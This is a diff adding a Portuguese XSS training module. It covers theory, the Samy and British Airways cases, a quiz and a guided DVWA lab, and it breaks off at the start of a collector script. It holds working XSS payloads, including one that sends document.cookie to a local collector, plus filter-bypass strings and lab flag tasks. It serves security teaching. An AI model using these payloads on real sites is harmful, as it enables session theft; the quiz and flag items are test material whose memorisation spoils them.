@@ -1,0 +1,864 @@
+---
+slug: xss
+track: trilha-4
+title: "Cross-Site Scripting (XSS)"
+prerequisites: [web-por-dentro]
+lab: dvwa
+tasks:
+  - slug: missao-1-armazenado
+    title: "Missão 1 — Roube a sessão com XSS armazenado"
+    type: flag
+    prompt: "Plante um XSS armazenado no guestbook do DVWA (nível low) que dispare o cookie da vítima para o seu coletor em 127.0.0.1:8099 pelo caminho /s. Quando o coletor receber uma sessão viva (security=low e PHPSESSID), ele imprime a flag. Cole-a aqui, no formato FLAG{12 hex}."
+    hint: "O campo mtxMessage tem maxlength=50, mas isso é só no navegador: mande o POST pelo Burp/curl sem o limite. O payload precisa ler document.cookie e enviá-lo — new Image().src=\"...\"+encodeURIComponent(document.cookie) basta, porque o cookie de sessão do DVWA não é HttpOnly."
+    flag:
+      hash: "scrypt$16384$8$1$0d4afc9f1ca9222ee09edf8c54578f28e073d2f4aacb5d69798e9b4ae82c5d3f"
+      salt: "21354edb8f6ed4abaab049a6a9753f4f"
+  - slug: missao-2-dom
+    title: "Missão 2 — DOM XSS que não passa pelo servidor"
+    type: flag
+    prompt: "Na página XSS (DOM) do DVWA (nível low), faça o sink document.write disparar um beacon para o seu coletor em 127.0.0.1:8099 pelo caminho /d, carregando document.cookie. O coletor imprime a flag quando confirma a execução no navegador. Cole-a aqui, no formato FLAG{12 hex}."
+    hint: "O JavaScript da página lê tudo o que vem depois de default= no document.location.href e joga em document.write, cru. O payload vai na URL, sem percent-encoding (decodeURI não desfaz %3C). Confirme antes, no nível low, que um <script> simples já executa."
+    flag:
+      hash: "scrypt$16384$8$1$0345d33fc8e025e9188fe426fadee72747aae10bf1c433394aba4b463abb18ef"
+      salt: "33ef4fc10b1b7f195d872dec4a7c862b"
+  - slug: quiz-final
+    title: "Quiz — Cross-Site Scripting (XSS)"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a causa-raiz do XSS?"
+        options:
+          - "O navegador tem um bug que o Chrome e o Firefox nunca corrigiram"
+          - "A aplicação coloca uma entrada não confiável dentro do HTML (ou do JS) da página, e o navegador interpreta esses caracteres como código, não como texto"
+          - "O servidor roda JavaScript inseguro no backend"
+          - "O usuário desligou o antivírus do navegador"
+        answer: 1
+        explanation: "XSS é injeção, prima da SQL injection: dado que vira código. A diferença é o interpretador — no XSS é o navegador da vítima, não o banco. A falha nasce na aplicação, que insere a entrada no HTML sem a codificação de saída (output encoding) daquele contexto. O navegador funciona como deve; o erro é misturar dado e marcação."
+      - question: "Qual é a diferença essencial entre XSS refletido, armazenado e DOM?"
+        options:
+          - "Refletido só funciona em HTTPS; armazenado só em HTTP; DOM em qualquer um"
+          - "Refletido volta na resposta do próprio pedido (atinge quem clica no link); armazenado fica salvo no servidor (atinge toda vítima que abre a página); DOM nunca passa pelo servidor (o JS da página executa o payload no navegador)"
+          - "São três nomes para o mesmo ataque"
+          - "Refletido e armazenado são client-side; DOM é server-side"
+        answer: 1
+        explanation: "O eixo é onde o payload vive e quando dispara. O armazenado é o mais grave porque uma injeção atinge todos os visitantes; o DOM é o mais sorrateiro porque o payload pode ir no fragmento (#), que nunca é enviado ao servidor — então não aparece no log."
+      - question: "O cookie de sessão marcado como HttpOnly protege contra o quê, exatamente?"
+        options:
+          - "Contra o XSS como um todo: com HttpOnly, o payload não executa"
+          - "Contra a leitura do cookie por JavaScript (document.cookie): o XSS ainda roda, mas não consegue exfiltrar o cookie de sessão"
+          - "Contra o roubo de senha no formulário de login"
+          - "Contra o CSRF, porque o cookie deixa de ser enviado"
+        answer: 1
+        explanation: "HttpOnly tira o cookie do alcance de document.cookie. É defesa em profundidade valiosa — corta o roubo de sessão —, mas não é a cura: o script injetado continua executando e pode agir como a vítima (fazer requisições autenticadas, um keylogger, etc.). A cura do XSS é a codificação de saída."
+      - question: "No DVWA, o nível medium do XSS refletido faz `str_replace('<script>', '', $name)`. Por que esse filtro falha?"
+        options:
+          - "Porque str_replace não existe em PHP"
+          - "Porque ele remove só a string exata `<script>` em minúsculas, uma vez: `<ScRiPt>`, `<img src=x onerror=...>` ou `<scr<script>ipt>` passam intactos"
+          - "Porque o filtro só funciona se o banco estiver ligado"
+          - "Porque ele bloqueia todas as tags, inclusive as legítimas"
+        answer: 1
+        explanation: "É uma blocklist frágil: diferencia maiúsculas, não é recursiva (remover um `<script>` do meio de `<scr<script>ipt>` remonta outro) e só conhece uma forma de executar JS, quando há dezenas (atributos onerror, onload, svg, etc.). Blocklist contra XSS é um jogo que o defensor perde."
+      - question: "Qual é a defesa que realmente elimina o XSS na maioria dos casos?"
+        options:
+          - "Esconder a barra de URL para o usuário não digitar payloads"
+          - "Uma blocklist que remove as palavras script, onerror e onload"
+          - "Codificação de saída sensível ao contexto (ex.: htmlspecialchars no contexto HTML), que transforma `<` em `&lt;` e deixa o navegador tratar a entrada como texto"
+          - "Trocar todos os cookies por tokens JWT"
+        answer: 2
+        explanation: "A cura é não deixar a entrada ser interpretada como marcação: codificar a saída no contexto certo (HTML, atributo, JS, URL). `htmlspecialchars` é o que o nível impossible do DVWA usa. Frameworks modernos fazem isso por padrão; a CSP e o HttpOnly são camadas extras, não substitutos."
+      - question: "Por que um DOM XSS entregue no fragmento da URL (depois do #) costuma não aparecer no log do servidor?"
+        options:
+          - "Porque o servidor apaga os logs automaticamente"
+          - "Porque o fragmento (a parte depois do #) não é enviado ao servidor pelo navegador; ele fica só no cliente, e é o JavaScript da página que o lê e o executa"
+          - "Porque o DOM XSS usa HTTPS e o log não registra HTTPS"
+          - "Porque o fragmento é criptografado"
+        answer: 1
+        explanation: "O fragmento nunca entra na requisição HTTP — é usado só pelo navegador. Como o payload do DOM XSS pode morar ali, o servidor jamais o vê, e a detecção baseada em log de acesso é cega a ele. Por isso o DOM XSS se analisa no cliente, lendo as fontes (sources) e os destinos (sinks) do JavaScript."
+glossary:
+  - term: cross-site scripting (XSS)
+    definition: "Falha em que uma aplicação web insere uma entrada não confiável no HTML ou no JavaScript de uma página sem a devida codificação, fazendo o navegador da vítima executar o código do atacante no contexto (origin) do site. É a injeção cujo interpretador é o navegador."
+  - term: reflected XSS
+    definition: "XSS em que o payload viaja na requisição (em geral na URL) e volta na resposta daquele mesmo pedido, sem ser gravado. Atinge só quem for induzido a abrir o link preparado pelo atacante."
+  - term: stored XSS
+    definition: "XSS (também chamado persistent) em que o payload é salvo pelo servidor — num comentário, perfil ou mensagem — e servido depois a toda vítima que abrir a página. É o mais grave, porque uma única injeção atinge muitos usuários."
+  - term: DOM-based XSS
+    definition: "XSS que acontece inteiramente no navegador: o JavaScript da própria página lê um dado controlável (uma source, como a URL) e o escreve num ponto perigoso (um sink, como innerHTML ou document.write). O payload pode nunca chegar ao servidor."
+  - term: source
+    definition: "Em análise de XSS/taint, a origem de um dado que o atacante controla e que entra no fluxo do programa — por exemplo location.hash, document.URL, o nome de um campo de formulário ou um parâmetro de query."
+  - term: sink
+    definition: "O ponto onde um dado é usado de um jeito perigoso — no XSS, onde a string vira marcação ou código executável (innerHTML, document.write, eval, outerHTML). Um XSS existe quando uma source alcança um sink sem codificação no caminho."
+  - term: Content Security Policy (CSP)
+    definition: "Cabeçalho HTTP (Content-Security-Policy) que diz ao navegador de onde ele pode carregar e executar scripts. Bem configurada (sem unsafe-inline, com nonce ou hash), ela bloqueia a execução do script injetado mesmo quando há um XSS — defesa em profundidade, não cura."
+  - term: htmlspecialchars
+    definition: "Função do PHP que converte os caracteres especiais do HTML em entidades: < vira &lt;, > vira &gt;, & vira &amp; e, com ENT_QUOTES, as aspas também. É a codificação de saída que neutraliza o XSS no contexto HTML; é o que o nível impossible do DVWA usa."
+  - term: Trusted Types
+    definition: "Recurso de navegador (ativado por CSP: require-trusted-types-for 'script') que proíbe passar strings cruas para sinks perigosos do DOM como innerHTML, obrigando o código a usar objetos validados. Fecha a porta do DOM XSS pela raiz."
+  - term: DOMPurify
+    definition: "Biblioteca JavaScript que higieniza (sanitiza) um trecho de HTML, removendo scripts e atributos perigosos e deixando só marcação segura. É a forma correta de permitir HTML do usuário (um editor de texto rico) sem abrir XSS."
+  - term: self-XSS
+    definition: "Golpe em que a própria vítima é convencida a colar um payload no console do navegador (DevTools), executando-o contra si mesma. Não é uma falha da aplicação; por isso os navegadores avisam ao abrir o console."
+  - term: blind XSS
+    definition: "XSS armazenado que dispara num contexto que o atacante não vê na hora — um painel interno, a tela de um atendente, um sistema de tickets. Confirma-se com um payload que chama de volta um coletor do atacante."
+  - term: mutation XSS (mXSS)
+    definition: "XSS que surge quando o navegador reescreve (muta) o HTML ao reparsear o DOM, transformando uma marcação que parecia segura numa que executa. Derruba sanitizadores que não consideram essa reinterpretação."
+  - term: web skimming
+    definition: "Ataque (também chamado formjacking ou Magecart) em que um script malicioso injetado numa página de pagamento copia os dados do cartão digitados e os envia ao atacante, enquanto a compra segue normalmente. XSS e componentes de terceiros comprometidos são vetores comuns."
+  - term: BeEF
+    definition: "Browser Exploitation Framework: ferramenta que, a partir de um XSS, prende (hook) o navegador da vítima e oferece um painel para disparar ações — ler teclas, pedir credenciais falsas, mapear a rede interna. Mostra o quanto um XSS vai além do alert."
+---
+
+import tiposDeXss from "./img/tipos-de-xss.svg";
+import rouboDeSessao from "./img/roubo-de-sessao.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Em 4.2 você viu a injeção cujo interpretador é o banco: a
+<GlossaryTerm term="SQL injection">SQL injection</GlossaryTerm>. Agora vem a
+injeção cujo interpretador é o **navegador da vítima**. O
+<GlossaryTerm term="cross-site scripting (XSS)">cross-site scripting</GlossaryTerm>
+(XSS) acontece quando a aplicação coloca a sua entrada dentro do HTML (ou do
+<GlossaryTerm term="JavaScript">JavaScript</GlossaryTerm>) de uma página sem
+tratá-la, e o navegador — que não tem como saber que aqueles caracteres vieram
+de um campo de formulário, e não do programador — os executa como código. O
+resultado não é um "popup de alerta": é o atacante rodando o JavaScript dele
+**dentro da sua sessão**, com os seus cookies, a sua tela e as suas permissões.
+
+Por que isso é tão perigoso? Porque o código roda no *origin* do site, atrás da
+<GlossaryTerm term="same-origin policy">same-origin policy</GlossaryTerm>, a
+regra que 4.1 apresentou: o JavaScript de um site só enxerga os dados daquele
+site — mas o XSS *é* JavaScript daquele site. Ele lê o
+<GlossaryTerm term="session cookie">cookie de sessão</GlossaryTerm>, faz
+requisições autenticadas em seu nome, reescreve a página para pedir sua senha,
+registra o que você digita. É a falha que transforma "um comentário num blog" em
+"controle da conta de quem lê o comentário".
+
+Não é falha de museu. A **OWASP** mantém a lista das classes de falha web mais
+críticas, o **OWASP Top 10**. Na edição **2021**, o XSS deixou de ser uma
+categoria própria e foi **absorvido por A03:2021 – Injection** (que caiu do 1º
+para o 3º lugar), sob a **CWE-79: Cross-site Scripting**, ao lado da CWE-89 (SQL
+injection). A categoria Injection reúne **33 CWEs**, apareceu em até **19,09%**
+das aplicações testadas (incidência média de 3,37%) e somou **274.228**
+ocorrências nos dados do projeto. Traduzindo: injeção, com o XSS dentro, é uma
+das falhas mais presentes da web.
+
+Este módulo fecha o ciclo **ataque + teoria + defesa**. Você vai entender *por
+que* o navegador executa o que não devia (seção 2), explorar as três famílias de
+XSS à mão no DVWA (seções 3 e 5), ver incidentes reais que começaram num XSS
+(seção 4) e, principalmente, aprender a escrever o código que **não** tem a falha
+(seção 8). O objetivo não é decorar `alert(1)`: é enxergar, em qualquer página,
+onde a entrada vira marcação.
+
+**Ao final, você vai saber:**
+
+- explicar a diferença entre XSS <GlossaryTerm term="reflected XSS">refletido</GlossaryTerm>,
+  <GlossaryTerm term="stored XSS">armazenado</GlossaryTerm> e
+  <GlossaryTerm term="DOM-based XSS">DOM</GlossaryTerm>, e dizer qual é o mais
+  grave e qual é o mais difícil de detectar, com o porquê;
+- confirmar uma injeção e escalar do `alert()` ao **roubo de sessão**, lendo
+  `document.cookie` e exfiltrando-o para um coletor que você mesmo sobe;
+- raciocinar sobre o contexto da injeção (corpo HTML, atributo, `<script>`, URL)
+  e por que o payload muda conforme o contexto;
+- furar filtros do tipo blocklist (os níveis `medium` e `high` do DVWA) e
+  entender por que eles são uma defesa perdida;
+- remediar o XSS com **codificação de saída** sensível ao contexto, **CSP**,
+  cookies `HttpOnly`/`SameSite`, sanitização e `Trusted Types`, e reconhecer as
+  defesas que **não** funcionam.
+
+**Pré-requisitos:**
+
+- **4.1 — Como a web funciona por dentro:** a requisição e a resposta HTTP, o
+  <GlossaryTerm term="HTTP cookie">cookie</GlossaryTerm> e o `Set-Cookie`, a
+  <GlossaryTerm term="same-origin policy">same-origin policy</GlossaryTerm>, o
+  <GlossaryTerm term="DOM">DOM</GlossaryTerm> e a ideia-mãe deste módulo — a
+  <GlossaryTerm term="trust boundary">trust boundary</GlossaryTerm>: tudo o que
+  chega na requisição vem de fora e pode ser forjado.
+
+**Tempo estimado:** de 4 a 6 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** no laboratório local (o DVWA, vulnerável de propósito e
+sem acesso à internet) ou em um alvo com **autorização por escrito**. XSS não é
+"brincadeira de popup": roubar a sessão de um usuário real, mesmo "só para
+mostrar", é acesso não autorizado a sistema — crime no Brasil (art. 154-A do
+Código Penal), como a Trilha 1 tratou. O coletor que você vai subir escuta
+apenas em `127.0.0.1`, dentro do Kali, e nunca na internet.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 A mesma doença da SQLi, outro paciente
+
+Guarde a frase de 4.2: *injeção é dado que vira comando, porque a aplicação
+mistura os dois no mesmo canal*. Na SQLi, o canal é a string da query e o
+interpretador é o banco. No XSS, o canal é o **HTML da página** e o interpretador
+é o **navegador**. É a mesma doença — por isso a OWASP juntou as duas em
+*Injection* em 2021 —, mas o paciente que adoece é diferente: não é o servidor, é
+o navegador de **outro usuário**.
+
+Isso muda tudo em relação à SQLi. A SQLi ataca o servidor e os dados; o XSS ataca
+**as outras pessoas** que usam o site. O atacante não quer executar código na sua
+máquina de desenvolvedor — quer executá-lo no navegador da vítima, no exato
+momento em que ela está logada. O site vulnerável é só o carteiro que entrega o
+código do atacante para a vítima, com o selo de confiança do próprio site.
+
+### 2.2 Por que o navegador obedece: HTML é código
+
+Para entender a falha, lembre o que o navegador faz com uma resposta HTTP. Ele
+recebe um texto — o HTML — e o **parseia**: separa o que é conteúdo (o texto que
+você lê) do que é marcação (as tags `<...>` que mandam no navegador). Uma tag
+`<b>` manda deixar em negrito; uma tag `<script>` manda **executar o conteúdo
+dela como JavaScript**. O navegador não "escolhe" obedecer: é a especificação do
+HTML. Se aparece um `<script>` bem-formado no documento, ele roda.
+
+Agora imagine uma página que cumprimenta o visitante pelo nome, assim (em PHP):
+
+```php
+echo "<pre>Hello " . $_GET['name'] . "</pre>";
+```
+
+Se `name` vale `Mesquita`, a resposta é `<pre>Hello Mesquita</pre>` — texto. Mas
+`name` é controlado por quem faz o pedido. Se alguém pedir
+`?name=<script>alert(1)</script>`, a resposta vira:
+
+```html
+<pre>Hello <script>alert(1)</script></pre>
+```
+
+O navegador parseia isso, encontra uma tag `<script>` legítima no meio do
+documento e **executa** `alert(1)`. A aplicação queria inserir um *nome* (dado) e
+acabou inserindo *marcação* (código). A fronteira entre dado e código, que no
+HTML é a sintaxe das tags, foi apagada pela entrada — exatamente como a aspa
+simples apagava a fronteira na SQLi.
+
+<Callout variant="info" title="O conserto, em uma linha, já aqui">
+O erro é tratar a entrada como marcação. O conserto é a **codificação de saída
+(output encoding)**: antes de pôr `name` na página, troque `<` por `&lt;` e `>`
+por `&gt;`. Aí a resposta vira `Hello &lt;script&gt;alert(1)&lt;/script&gt;`, que
+o navegador mostra como o *texto* `<script>alert(1)</script>` — e nada executa.
+Simples assim; a seção 8 detalha. Tudo o que vem antes é entender por que a falta
+desse passo é tão perigosa.
+</Callout>
+
+### 2.3 Contexto é tudo: o mesmo dado, cinco lugares
+
+O ponto que separa quem decora payloads de quem entende XSS é o **contexto**: em
+que parte do documento a sua entrada cai. O payload que funciona num lugar é
+inofensivo em outro, e a codificação que defende um contexto não defende outro.
+Os cinco contextos clássicos:
+
+- **Corpo HTML** — `<div>AQUI</div>`. Payload típico: `<script>…</script>` ou
+  `<img src=x onerror=…>`. Codificação: `htmlspecialchars` (entidades HTML).
+- **Atributo** — `<input value="AQUI">`. Você precisa primeiro **fechar a aspa**
+  do atributo: `"><script>…` ou injetar um `onmouseover=…`. Codificar só `<` e
+  `>` não basta aqui: a aspa (`"`) também tem de virar entidade.
+- **Dentro de `<script>`** — `var nome = "AQUI";`. Não precisa de tag nenhuma;
+  basta fechar a string e o script: `";alert(1);//`. A defesa é a codificação
+  para o contexto JavaScript, não a HTML.
+- **URL** — `<a href="AQUI">`. Um `javascript:alert(1)` como href executa ao
+  clicar. Defesa: validar o esquema (só `http`/`https`) e codificar para URL.
+- **Fragmento / DOM** — a entrada nem passa pelo servidor; o JavaScript da página
+  a lê e a escreve no DOM. É o DOM XSS, adiante.
+
+A lição: **não existe "a" codificação certa; existe a codificação certa para o
+contexto.** Guardar isso evita o erro clássico de aplicar `htmlspecialchars` e
+achar que está seguro quando a entrada cai dentro de um `onclick=` ou de um
+`<script>`.
+
+### 2.4 As três famílias
+
+<Figure
+  src={tiposDeXss}
+  alt="Três faixas horizontais comparam os caminhos do ataque. Faixa 1, refletido: o atacante monta um link com o payload na query (?name=<script>…), a vítima clica, o servidor devolve o payload na própria resposta e o navegador executa; nada é gravado e só quem clica é atingido. Faixa 2, armazenado: o atacante envia o payload uma vez num comentário, o servidor grava no banco com um INSERT, e a partir daí toda vítima que abre a página recebe e executa o payload. Faixa 3, DOM: o atacante manda um link com o payload no fragmento depois do #, o JavaScript da página lê o location e faz document.write, o payload é escrito no DOM e executa, e o servidor nunca vê o payload porque o # não é enviado."
+  caption="As três famílias de XSS diferem em onde o payload vive e quando dispara. O armazenado é o mais grave (atinge todos); o DOM é o mais sorrateiro (o servidor não vê o payload)."
+/>
+
+**Refletido (reflected).** O payload vai na requisição e **volta na resposta
+daquele mesmo pedido**. Nada é gravado. O atacante precisa entregar à vítima um
+link preparado (`https://site/busca?q=<script>…`) e convencê-la a clicar — por
+e-mail, mensagem, um anúncio. Atinge só quem clica, uma vez.
+
+**Armazenado (stored, ou persistent).** O payload é **salvo no servidor** — num
+comentário, num nome de perfil, numa mensagem de suporte — e **servido depois a
+toda vítima** que abrir a página. O atacante injeta uma vez e colhe muitos; não
+precisa enganar ninguém a clicar em link nenhum, porque a página legítima já
+entrega o payload. É o mais grave, e foi assim que o worm da seção 4 se espalhou.
+
+**DOM (DOM-based).** A injeção acontece **inteiramente no navegador**. O
+JavaScript da página lê um dado que o atacante controla — uma
+<GlossaryTerm term="source">source</GlossaryTerm>, como `location.hash` ou
+`document.URL` — e o escreve num ponto perigoso — um
+<GlossaryTerm term="sink">sink</GlossaryTerm>, como `innerHTML`, `document.write`
+ou `eval`. O servidor pode nunca ver o payload (se ele vier no fragmento depois
+do `#`, que o navegador não envia). Por isso o DOM XSS escapa de filtros no
+servidor e de análise de log: é um bug do **cliente**, e se caça lendo o
+JavaScript, rastreando cada source até o sink que ela alcança.
+
+## 3. Como o ataque funciona — a mecânica
+
+Toda a mecânica abaixo foi executada no lab `dvwa` deste módulo (nível `low`) e
+as saídas são reais; os valores de sessão foram trocados por exemplos. O alvo é o
+DVWA em `http://dvwa/`, alcançável de dentro do Kali.
+
+### 3.1 Passo 1 — confirmar a injeção (refletido)
+
+A página **XSS (Reflected)** cumprimenta pelo parâmetro `name`. Primeiro, um nome
+benigno, para ver o comportamento normal, e depois o teste de injeção. Usamos o
+`curl` de dentro do Kali, com o cookie de uma sessão já autenticada em `low`
+(o `-b` aponta o cookie jar; o login em si está na seção 5):
+
+```console
+$ curl -s -b cookies.txt "http://dvwa/vulnerabilities/xss_r/?name=Mesquita" | grep Hello
+		<pre>Hello Mesquita</pre>
+$ curl -s -b cookies.txt "http://dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" | grep Hello
+		<pre>Hello <script>alert(1)</script></pre>
+```
+
+Repare: o `<script>` voltou **cru**, dentro do `<pre>`. Não virou `&lt;script&gt;`.
+Isso é a confirmação da falha — num navegador, aquele `<script>` executa. O
+`curl` não roda JavaScript (por isso não vemos o alerta), mas ele prova o que
+importa: a entrada chega ao HTML sem codificação. Essa é a primeira coisa a
+procurar: **mande um `<` e veja se ele volta como `<` ou como `&lt;`.**
+
+### 3.2 Passo 2 — do `alert` ao roubo de sessão
+
+`alert(1)` prova que há execução, mas não faz estrago; é a prova de conceito mais
+educada que existe. O que um atacante faz de verdade é usar a execução para algo
+útil. O alvo nº 1 é a **sessão**: se o cookie de sessão não é
+<GlossaryTerm term="HttpOnly">HttpOnly</GlossaryTerm>, o JavaScript injetado o lê
+com `document.cookie` e o manda para fora. É o
+<GlossaryTerm term="session hijacking">session hijacking</GlossaryTerm> (roubo de
+sessão): com o cookie da vítima no próprio navegador, o atacante **é** a vítima,
+sem nunca saber a senha dela.
+
+<Figure
+  src={rouboDeSessao}
+  alt="Diagrama de sequência com quatro colunas — atacante, servidor com banco, navegador da vítima logada e coletor do atacante. Passo 1: o atacante planta uma vez o payload <script>new Image().src='http://coletor/?c='+document.cookie</script> num comentário, e o servidor faz INSERT no banco. Passo 2: a vítima logada abre a página. Passo 3: a resposta traz o conteúdo mais o script do atacante. Passo 4: o navegador executa o script no contexto do site e, como o cookie não é HttpOnly, lê document.cookie. Passo 5: o script envia o cookie ao coletor. Passo 6: o atacante põe o cookie no próprio navegador e navega como a vítima. Um rodapé diz que marcar o cookie como HttpOnly tira document.cookie do alcance do script e corta o passo 4."
+  caption="O roubo de sessão por XSS armazenado, passo a passo. A sessão é a credencial: com o cookie, o atacante dispensa a senha. HttpOnly corta o passo 4."
+/>
+
+O payload que faz isso cabe numa linha. Ele cria uma imagem cuja URL carrega o
+cookie; o navegador, ao tentar baixar a "imagem", faz um GET para o coletor do
+atacante — e o cookie viaja na URL desse GET:
+
+```javascript
+<script>
+  new Image().src = "http://127.0.0.1:8099/s?c=" + encodeURIComponent(document.cookie);
+</script>
+```
+
+Não precisa ser uma imagem; `fetch()` serve igual. O truque da imagem é antigo
+porque funciona mesmo em contextos onde `fetch` esbarraria em CORS — um GET de
+imagem não é barrado pela
+<GlossaryTerm term="same-origin policy">same-origin policy</GlossaryTerm> para
+*enviar* (só a *leitura* da resposta é). O que o atacante quer é enviar; a
+resposta, ele nem lê.
+
+### 3.3 Passo 3 — o contexto do DOM, sem passar pelo servidor
+
+A página **XSS (DOM)** do DVWA é um caso de livro. O JavaScript dela monta a
+lista de idiomas lendo o parâmetro `default` **da própria URL**, no cliente:
+
+```javascript
+if (document.location.href.indexOf("default=") >= 0) {
+  var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
+  document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+}
+```
+
+Leia o fluxo: a **source** é `document.location.href` (a URL, que o atacante
+controla); o **sink** é `document.write`, que escreve HTML cru no documento. Entre
+uma e outro, nenhuma codificação. Quem põe `?default=<script>alert(1)</script>`
+faz o `document.write` escrever a tag `<script>` no documento durante o parsing —
+e ela executa. O servidor entrega sempre a mesma página; **o payload é montado no
+navegador**. Se o atacante usar `#` em vez de `?` em outras variantes, o servidor
+nem recebe o payload.
+
+### 3.4 O que a resposta do servidor realmente mostra
+
+Vale fixar a diferença no HTTP. No refletido e no armazenado, o payload aparece
+no corpo da resposta (dá para ver com `curl`). No DOM, não: a resposta é idêntica
+para todos, e o payload só existe depois que o JavaScript roda. Essa é a razão de
+o DOM XSS furar <GlossaryTerm term="WAF">WAFs</GlossaryTerm> e análises de log que
+só olham a requisição e a resposta do servidor.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### O worm Samy, no MySpace (outubro de 2005)
+
+Em **4 de outubro de 2005**, Samy Kamkar publicou no próprio perfil do MySpace um
+XSS **armazenado**. O MySpace filtrava a palavra `javascript`, então Samy a
+quebrou em duas linhas dentro de uma folha de estilo (um truque que o Internet
+Explorer da época aceitava) e usou `XMLHttpRequest` para duas coisas: fazer quem
+visse seu perfil **adicioná-lo como amigo** e acrescentar "but most of all, samy
+is my hero" ao perfil da vítima — e, crucialmente, **copiar o próprio script para
+o perfil dela**. Cada visitante virava um novo portador. Era um worm.
+
+- **Impacto:** pela conta do próprio autor, **mais de 1 milhão** de perfis
+  infectados em **menos de 20 horas** — o malware que mais rápido se espalhou até
+  então. O MySpace tirou o site do ar para conter.
+- **Lição:** é o retrato de por que o XSS **armazenado** é o mais grave — uma
+  injeção que se auto-propaga — e de por que **blocklist** (filtrar a palavra
+  `javascript`) é defesa furada: sempre há uma variação. Samy foi condenado e
+  proibido de usar computador por um tempo; o "popup inofensivo" tem consequência
+  legal real.
+- **Fonte:** [relato técnico do próprio autor, "The MySpace Worm"](https://samy.pl/myspace/).
+
+### British Airways: XSS/Magecart e a multa recorde do ICO (2018–2020)
+
+Entre **21 de agosto e 5 de setembro de 2018** (o período de skimming que a
+autoridade apurou), atacantes do tipo
+<GlossaryTerm term="web skimming">Magecart</GlossaryTerm> inseriram **22 linhas de
+JavaScript** malicioso no site e no app da British Airways. O script fazia
+<GlossaryTerm term="web skimming">web skimming</GlossaryTerm>: copiava os dados de
+cartão que o cliente digitava e os enviava a um servidor controlado pelo atacante,
+enquanto a compra seguia normal. É o mesmo princípio do XSS — script não
+confiável executando na página — aplicado a roubar pagamentos.
+
+- **Impacto:** dados pessoais de cerca de **429.612** clientes e funcionários
+  (incluindo números de cartão e CVV de parte deles). Em **16 de outubro de
+  2020**, o **ICO** (a autoridade de proteção de dados do Reino Unido) aplicou
+  **£20 milhões** de multa — reduzida do valor inicialmente proposto de **£183,39
+  milhões** (anunciado em julho de 2019), em parte pela pandemia, mas ainda a
+  maior multa do ICO até então.
+- **Lição:** o script injetado não precisa roubar sessão — pode roubar o que a
+  vítima digita, ali mesmo. E a defesa que teria cortado o vetor é a desta aula:
+  **Content Security Policy** restringindo de onde scripts podem carregar e para
+  onde podem enviar dados, além de controlar os componentes de terceiros da
+  página.
+- **Fonte:** [resumo da investigação e da penalidade do ICO (com os números do penalty notice)](https://en.wikipedia.org/wiki/British_Airways_data_breach).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá confirmado o XSS refletido, plantado um XSS
+**armazenado** que rouba a sessão da vítima para um coletor que você mesmo sobe
+(**Missão 1**) e disparado um **DOM XSS** que não passa pelo servidor
+(**Missão 2**). Cada missão entrega uma flag que só aparece quando o ataque
+funciona de verdade.
+
+<Callout variant="warning" title="Um lab por vez">
+O DVWA sobe junto com o Kali (regra de RAM: um lab ativo por vez). Se outro lab
+estiver rodando, pare-o antes.
+</Callout>
+
+### 5.1 Subir o laboratório e logar
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. O
+   desktop do Kali abre embutido. (Pelo terminal, o equivalente é
+   `scripts/lab.sh up dvwa`.)
+2. No Kali, abra o navegador em `http://dvwa/` e entre com `admin` / `password`.
+3. Vá em **DVWA Security** e ponha o nível em **low**. Confirme embaixo da
+   página: *Security Level: low*.
+
+Para trabalhar também pela linha de comando (mais rápido para os desafios), abra
+um terminal no Kali e faça o login com `curl`, guardando os cookies. O DVWA exige
+um token anti-CSRF (`user_token`) em cada formulário — você viu o porquê em 4.1:
+
+```console
+$ TOK=$(curl -s -c cookies.txt "http://dvwa/login.php" \
+    | grep -oP "user_token' value='\K[0-9a-f]{32}")
+$ curl -s -b cookies.txt -c cookies.txt \
+    --data "username=admin&password=password&Login=Login&user_token=$TOK" \
+    "http://dvwa/login.php" -o /dev/null -w "login: %{http_code}\n"
+login: 302
+$ TOK2=$(curl -s -b cookies.txt "http://dvwa/security.php" \
+    | grep -oP "user_token' value='\K[0-9a-f]{32}")
+$ curl -s -b cookies.txt -c cookies.txt \
+    --data "security=low&seclev_submit=Submit&user_token=$TOK2" \
+    "http://dvwa/security.php" -o /dev/null -w "security set: %{http_code}\n"
+security set: 302
+```
+
+Os `302` confirmam o login e a troca de nível. Agora o `cookies.txt` tem uma
+sessão viva em `low`.
+
+### 5.2 Guiado — confirme o refletido no navegador
+
+Na página **XSS (Reflected)**, no campo **What's your name?**, digite
+`<script>alert(document.cookie)</script>` e envie. Um popup aparece com o seu
+cookie de sessão — a prova de que o script executa e **vê** o cookie. É o mesmo
+que você já confirmou no HTTP em 3.1: a entrada volta como marcação.
+
+<Callout variant="tip" title="Por que o cookie aparece no alert">
+Porque o cookie de sessão do DVWA **não** é `HttpOnly`. Guarde isso: é
+exatamente o que vamos abusar na Missão 1, e o que a defesa da seção 8 corta.
+</Callout>
+
+### 5.3 Missão 1 (desafio) — XSS armazenado que rouba a sessão
+
+Agora o alvo é a página **XSS (Stored)** — o guestbook, onde `Name` e `Message`
+ficam **salvos** e são mostrados a quem abrir a página. Seu objetivo: plantar um
+payload que, ao ser visto, mande o cookie da vítima para um **coletor** seu.
+
+**Primeiro, suba o coletor.** Ele escuta só em `127.0.0.1` (dentro do Kali), não
+tem vulnerabilidade e não acessa a internet — respeita o isolamento do lab. Crie
+o arquivo `coletor.py` no Kali:
+
+<CodeBlock title="coletor.py" lang="python" code={`#!/usr/bin/env python3
+# Coletor de exfiltracao de XSS: escuta so em 127.0.0.1, sem internet e sem
+# vulnerabilidade. Recebe os beacons do payload e, quando a sessao chega,
+# imprime a flag.
+#   /s?c=<document.cookie>  -> Missao 1 (XSS armazenado, roubo de sessao)
+#   /d?c=<document.cookie>  -> Missao 2 (DOM XSS)
+import functools, http.server, urllib.parse, re, hashlib
+print = functools.partial(print, flush=True)
+SID = re.compile(r"PHPSESSID=[0-9a-f]{32}")
